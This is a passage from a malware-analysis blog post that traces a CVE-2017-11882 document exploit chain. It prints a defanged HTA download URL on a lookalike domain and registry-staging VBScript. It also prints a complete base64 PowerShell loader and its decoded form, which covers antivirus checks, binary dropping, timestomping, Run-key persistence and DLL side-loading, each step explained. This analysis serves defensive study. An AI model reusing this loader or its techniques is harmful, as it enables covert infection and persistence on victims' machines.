target="_blank">https://github.com/0x09AL/CVE-2017-11882-metasploit</a></p><p id="2bdb" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The exploitation is the following:</p><p id="5e00" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">an hta is downloaded here and lauched by msthll.dll.RunHMLApplication.</p><p id="af13" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">caller.exe <a class="ah ps" href="http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta" rel="noopener ugc nofollow" target="_blank">hxxp://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta</a></p><p id="9584" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The hta is a mix of powershell, vbscript and javascript.</p><h2 id="a5f5" class="ml mm hd bg mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni bl">Installation of payload and Persistance</h2><p id="654b" class="pw-post-body-paragraph nr ns hd nt b nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo gw bl">The installation of the payload made by vscript a line 151</p><p id="e570" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">objWSS.RegWrite “HK”&amp;”CU\Softwa”&amp;”re\Updater\pa”&amp;”rt3&quot;, bnm, “REG_SZ”</p><p id="d378" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">here</p><p id="c2d0" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">tst = getProfile(“0”) &amp; “$c=”””&amp;c&amp;”””;$m=”””&amp;m&amp;”””;”&amp; Base64Decode(objWSS.RegRead(“HKEY_CURRENT_USER\Softwa”&amp;”re\Updater\pa”&amp;”rt3&quot;)) &amp; getProfile(“1”)<br/>objWSS.run “powershell.exe -ExecutionPolicy Bypass -Command “”” &amp; tst &amp; “”””, 0, true</p><p id="55e3" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">and here:</p><p id="4cc1" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">objWSS.RegWrite “HKCU\Software\Updater”, “”<br/> objWSS.RegWrite “HKCU\Software\Updater\part1”, p1, “REG_SZ”<br/> objWSS.RegWrite “HKCU\Software\Updater\part2”, p2, “REG_SZ”</p><p id="b229" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The registry is used like pivot.</p><p id="1f87" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">p1, p2 and bnm are three blobs of base64 data.</p><p id="94f8" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">bdm decoded is:</p><blockquote class="pt pu pv"><p id="7ba3" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“””U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlOw0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7DQoNCiRwbmFtZTM2ID0gIjMiICsgIjYwVHIiICsgImF5Ig0KJGJpbkRpciA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW0VudW1dOjpUb09iamVjdChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdLCAzNSkpKyAiXCIgKyAiV2luc2V0XENvbmZpZyIgKyAiXCI7DQokYmluID0gIldpbnNldC5leGUiOw0KdHJ5ew0KJGNtZExpbmUgPSAoW2ludF0kYykudG9TdHJpbmcoIjAwMDAwMDAwIikrKFtpbnRdJG0pLnRvU3RyaW5nKCIwMDAwMDAwMCIpOw0KJGNtZExpbmUgPSAkYmluKyAiICIgKyRjbWRMaW5lOw0KfQ0KY2F0Y2h7DQokY21kTGluZSA9ICRiaW47DQp9DQokbGluZSA9IG5ldy1vYmplY3QgYnl0ZVtdIDY0Ow0KJGJ1ZjYgPVtCeXRlW11dICgsMHgyMyAqIDY0KTsNCiRjYnl0ZXMgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkY21kTGluZSk7DQpbYXJyYXldOjpjb3B5KCRjYnl0ZXMsJGxpbmUsJGNieXRlcy5sZW5ndGgpOw0KDQokYmluUGF0aCA9ICRiaW5EaXIgKyAkYmluOw0KJGJpblBhdGhkbGwgPSAkYmluRGlyICsgImNtcGJrMzIuZGxsIjsNCiRkbXliaW5QYXRoID0gJGJpbkRpciArICJjbWRsMzIuZXhlIjsNCiRycGNkbGxwYXRoID0gJGJpbkRpciArICI1NzE0NkM5Ni5kbGwiOw0KJHJ1biA9ICdIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwnOw0KJHN5c3RlbSA9ICdIS0NVOlNvZnR3YXJlXFVwZGF0ZXInOw0KJHJ1bkV4aXN0cyA9IEZhbHNlOw0KJHBuYW1lYXZyID0gImF2IiArICJnbiIgKyAidCI7DQokbXN2YnZtZGxscGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxtc3Zidm02MC5kbGwiDQokY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxjbWRsMzIuZXhlIg0KDQokcTM2ID0gR2V0LVByb2Nlc3MgJHBuYW1lMzYgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7DQppZigkcTM2KXsNCglleGl0DQp9DQoNCmZ1bmN0aW9uIGRjKCRzKXsNCglzYWwgbiBOZXctT2JqZWN0Ow0KCSRkYXRhID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSDRzSUFBQUFBQUEiICsgJHMpOw0KCSRtcyA9IG4gU3lzdGVtLklPLk1lbW9yeVN0cmVhbTsNCgkkbXMuV3JpdGUoJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7DQoJJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsOw0KCXJldHVybiAobiBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKG4gU3lzdGVtLklPLkNvbXByZXNzaW9uLkdaaXBTdHJlYW0oJG1zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7DQp9Ow0KDQpmdW5jdGlvbiB1cGR0KCR0LCAkYil7DQoJKGxzICR0KS5MYXN0V3JpdGVUaW1lID0gIChscyAkYikuTGFzdFdyaXRlVGltZQ0KCShscyAkdCkuQ3JlYXRpb25UaW1lID0gKGxzICRiKS5DcmVhdGlvblRpbWUNCgkobHMgJHQpLkxhc3RBY2Nlc3NUaW1lID0gKGxzICRiKS5MYXN0QWNjZXNzVGltZQ0KfQ0KDQpmdW5jdGlvbiB3YjY0KCRwYXRoLCAkYjY0KXsNCgkkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJUVnEiICsgJGI2NCk7DQoJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCVtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygkcGF0aCwkYnl0ZXMpIHwgT3V0LU51bGw7DQoJdXBkdCAtdCAkcGF0aCAtYiAkY21kbDMycGF0aA0KfQ0KDQpmdW5jdGlvbiBzYigkaCwgJG4gKSB7DQogICAgJGxlbiA9ICRuLmxlbmd0aDsNCiAgICAkbGltaXQgPSAkaC5sZW5ndGggLSAkbGVuOw0KICAgIEZvciggJGkgPSAwOyAgJGkgLWxlICRsaW1pdDsgICRpKysgKSB7DQogICAgICAgICRrID0gMDsNCiAgICAgICAgRm9yKCA7ICAkayAtbHQgJGxlbjsgICRrKysgKSB7DQogICAgICAgICAgICBpZiggJG5bJGtdIC1uZSAkaFskaSska10gKSB7YnJlYWt9Ow0KICAgICAgICB9DQogICAgICAgIGlmKCAkayAtZXEgJGxlbiApe3JldHVybiAkaX07DQogICAgfQ0KICAgIHJldHVybiAtMTsNCn0NCg0KaWYoKFRlc3QtUGF0aCAkZW52OldJTkRJUlxTeXNXT1c2NCkpew0KCSRtc3Zidm1kbGxwYXRoID0gJGVudjpXSU5ESVIgKyAiXFN5c1dPVzY0XG1zdmJ2bTYwLmRsbCINCgkkY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxTeXNXT1c2NFxjbWRsMzIuZXhlIg0KfQ0KDQp0cnl7DQoJaWYoIShUZXN0LVBhdGggJGJpblBhdGgpKXsNCg0KCQkkYjY0ID0gZGMgLXMgKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRzeXN0ZW0pLnBhcnQxKTsNCgkJJGJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVFZxIiArICRiNjQpOw0KCQkkcm4gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKChHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTExMSkpWzAuLjFdOw0KCQlbYXJyYXldOjpjb3B5KCRybiwwLCRieXRlcywkYnl0ZXMubGVuZ3RoIC0gMiwyKTsNCgkJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCQlbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJGJpblBhdGgsJGJ5dGVzKSB8IE91dC1OdWxsOw0KCQl1cGR0IC10ICRiaW5QYXRoIC1iICRjbWRsMzJwYXRoDQoNCgkJJGI2NGRsbCA9IGRjIC1zICgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkc3lzdGVtKS5wYXJ0Mik7DQogICAgICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlRWcSIgKyAkYjY0ZGxsKTsNCgkJW2FycmF5XTo6Y29weSgkbGluZSwwLCRieXRlcywoc2IgLWggJGJ5dGVzIC1uICRidWY2KSw2NCk7DQoJCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICRiaW5EaXIgfCBPdXQtTnVsbDsNCgkJW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRiaW5QYXRoZGxsLCRieXRlcykgfCBPdXQtTnVsbDsNCgkJdXBkdCAtdCAkYmluUGF0aGRsbCAtYiAkY21kbDMycGF0aA0KCX0NCg0KCVJlbW92ZS1JdGVtIC1QYXRoICRzeXN0ZW0gfCBPdXQtTnVsbDsNCglSZW1vdmUtSXRlbSAkUFJPRklMRS5DdXJyZW50VXNlckFsbEhvc3RzIHwgT3V0LU51bGw7DQoJTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcnVuIC1OYW1lICJXaW5zb3VuZCIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICRkbXliaW5QYXRoIHwgT3V0LU51bGw7DQoJDQoJQ29weS1JdGVtICAkbXN2YnZtZGxscGF0aCAkcnBjZGxscGF0aA0KCXVwZHQgLXQgJHJwY2RsbHBhdGggLWIgJG1zdmJ2bWRsbHBhdGgNCg0KCUNvcHktSXRlbSAkY21kbDMycGF0aCAkZG15YmluUGF0aA0KCXVwZHQgLXQgJGRteWJpblBhdGggLWIgJGNtZGwzMnBhdGgNCg0KCSRhdnIgPSBHZXQtUHJvY2VzcyAkcG5hbWVhdnIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCglpZiAoISRhdnIpIHsNCgkJJigkZG15YmluUGF0aCkgfCBPdXQtTnVsbDsNCgl9DQoJRXhpdA0KfQ0KY2F0Y2ggew0KCSRfLkV4Y2VwdGlvbi5NZXNzYWdlIHwgT3V0LU51bGw7DQp9&quot;””)))</p></blockquote><p id="3d63" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">There is a new base64 block decoded:</p><blockquote class="pt pu pv"><p id="7386" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force;<br/>$ErrorActionPreference=’SilentlyContinue’;</p><p id="818a" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$pname36 = “3” + “60Tr” + “ay”<br/>$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\” + “Winset\Config” + “\”;<br/>$bin = “Winset.exe”;<br/>try{<br/>$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);<br/>$cmdLine = $bin+ “ “ +$cmdLine;<br/>}<br/>catch{<br/>$cmdLine = $bin;<br/>}<br/>$line = new-object byte[] 64;<br/>$buf6 =[Byte[]] (,0x23 * 64);<br/>$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);<br/>[array]::copy($cbytes,$line,$cbytes.length);</p><p id="58ba" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$binPath = $binDir + $bin;<br/>$binPathdll = $binDir + “cmpbk32.dll”;<br/>$dmybinPath = $binDir + “cmdl32.exe”;<br/>$rpcdllpath = $binDir + “57146C96.dll”;<br/>$run = ‘HKCU:Software\Microsoft\Windows\CurrentVersion\Run\’;<br/>$system = ‘HKCU:Software\Updater’;<br/>$runExists = False;<br/>$pnameavr = “av” + “gn” + “t”;<br/>$msvbvmdllpath = $env:WINDIR + “\system32\msvbvm60.dll”<br/>$cmdl32path = $env:WINDIR + “\system32\cmdl32.exe”</p><p id="2203" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;<br/>if($q36){<br/> exit<br/>}</p><p id="4b28" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">function dc($s){<br/> sal n New-Object;<br/> $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);<br/> $ms = n System.IO.MemoryStream;<br/> $ms.Write($data, 0, $data.Length);<br/> $ms.Seek(0,0) | Out-Null;<br/> return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p><p id="f854" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">function updt($t, $b){<br/> (ls $t).LastWriteTime = (ls $b).LastWriteTime<br/> (ls $t).CreationTime = (ls $b).CreationTime<br/> (ls $t).LastAccessTime = (ls $b).LastAccessTime<br/>}</p><p id="2c33" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">function wb64($path, $b64){<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($path,$bytes) | Out-Null;<br/> updt -t $path -b $cmdl32path<br/>}</p><p id="0563" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">function sb($h, $n ) {<br/> $len = $n.length;<br/> $limit = $h.length — $len;<br/> For( $i = 0; $i -le $limit; $i++ ) {<br/> $k = 0;<br/> For( ; $k -lt $len; $k++ ) {<br/> if( $n[$k] -ne $h[$i+$k] ) {break};<br/> }<br/> if( $k -eq $len ){return $i};<br/> }<br/> return -1;<br/>}</p><p id="14bf" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">if((Test-Path $env:WINDIR\SysWOW64)){<br/> $msvbvmdllpath = $env:WINDIR + “\SysWOW64\msvbvm60.dll”<br/> $cmdl32path = $env:WINDIR + “\SysWOW64\cmdl32.exe”<br/>}</p><p id="d993" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">try{<br/> if(!(Test-Path $binPath)){</p><p id="b496" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$b64 = dc -s ((Get-ItemProperty -Path $system).part1);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];<br/> [array]::copy($rn,0,$bytes,$bytes.length — 2,2);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;<br/> updt -t $binPath -b $cmdl32path</p><p id="9d6a" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);<br/> [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;<br/> updt -t $binPathdll -b $cmdl32path<br/> }</p><p id="ca4f" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Remove-Item -Path $system | Out-Null;<br/> Remove-Item $PROFILE.CurrentUserAllHosts | Out-Null;<br/> New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;<br/> <br/> Copy-Item $msvbvmdllpath $rpcdllpath<br/> updt -t $rpcdllpath -b $msvbvmdllpath</p><p id="28b4" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Copy-Item $cmdl32path $dmybinPath<br/> updt -t $dmybinPath -b $cmdl32path</p><p id="737b" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$avr = Get-Process $pnameavr -ErrorAction SilentlyContinue<br/> if (!$avr) {<br/> &amp;($dmybinPath) | Out-Null;<br/> }<br/> Exit<br/>}<br/>catch {<br/> $_.Exception.Message | Out-Null;<br/>}</p></blockquote><p id="dd52" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">This powershell checks if the AV 360 is installed:</p><blockquote class="pt pu pv"><p id="cc6b" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$pname36 = “3” + “60Tr” + “ay”</p><p id="fd7e" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;<br/>if($q36){<br/> exit<br/>}</p></blockquote><p id="6f46" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">We can imagine the attackers were made a recon step before.</p><p id="cfbc" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The folder where the loadin chain is:</p><blockquote class="pt pu pv"><p id="12ee" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\” + “Winset\Config” + “\”;</p></blockquote><p id="dd1f" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The powershell copies:</p><p id="7853" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$msvbvmdllpath = $env:WINDIR + “\system32\msvbvm60.dll”<br/>$cmdl32path = $env:WINDIR + “\system32\cmdl32.exe”</p><p id="805a" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Copy-Item $cmdl32path $dmybinPath</p><p id="b722" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Copy-Item $msvbvmdllpath $rpcdllpath</p><p id="ba77" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">So msvbvm60.dll becomes: 57146C96.dll</p><p id="64ed" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">And Winset.exe and cmpbk32.dll are decoded and copied in the same folder.</p><p id="4983" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">part1 and part2 is the reg key base here $system = ‘HKCU:Software\Updater’;:</p><p id="1042" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">objWSS.RegWrite “HKCU\Software\Updater”, “”<br/>objWSS.RegWrite “HKCU\Software\Updater\part1”, p1, “REG_SZ”<br/>objWSS.RegWrite “HKCU\Software\Updater\part2”, p2, “REG_SZ”</p><p id="a53d" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">part1 is big blob of base64 data.</p><p id="6308" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">Firstly the registry key is retrieve:</p><p id="6384" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">(Get-ItemProperty -Path $system).part1</p><p id="1a64" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">after is the function dc is called.</p><blockquote class="pt pu pv"><p id="992c" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">function dc($s){<br/> sal n New-Object;<br/> $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);<br/> $ms = n System.IO.MemoryStream;<br/> $ms.Write($data, 0, $data.Length);<br/> $ms.Seek(0,0) | Out-Null;<br/> return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p></blockquote><p id="35c5" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">this string “H4sIAAAAAAA” is added at part2 and the data is decoded an</p><blockquote class="pt pu pv"><p id="2852" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);</p></blockquote><p id="ca52" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">and unzip:</p><blockquote class="pt pu pv"><p id="5f3b" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();<br/>};</p></blockquote><p id="ae1f" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">and the Mz header in base64 is added and decoded:</p><blockquote class="pt pu pv"><p id="10e5" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);</p></blockquote><p id="762a" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">and the executable is modified for the last time and copied in $binDir:</p><blockquote class="pt pu pv"><p id="442c" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);<br/> $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];<br/> [array]::copy($rn,0,$bytes,$bytes.length — 2,2);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;</p></blockquote><p id="7639" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The dll is decoded, modified and written on disk in the same way:</p><blockquote class="pt pu pv"><p id="da3f" class="nr ns pw nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);<br/> $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);<br/> [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);<br/> New-Item -ItemType Directory -Force -Path $binDir | Out-Null;<br/> [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;<br/> updt -t $binPathdll -b $cmdl32path</p></blockquote><p id="bcfb" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The Trick very important here is : <strong class="nt he">[array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64); t</strong>o modify the dll.</p><p id="8d37" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">If you decode the before the modification you have a dll truncated.</p><p id="5f20" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">before:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov px"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*mwhQ9Jt9xLiVaH_mVv6uaw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="371" loading="lazy" role="presentation"/></picture></div></div></figure><p id="c640" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og 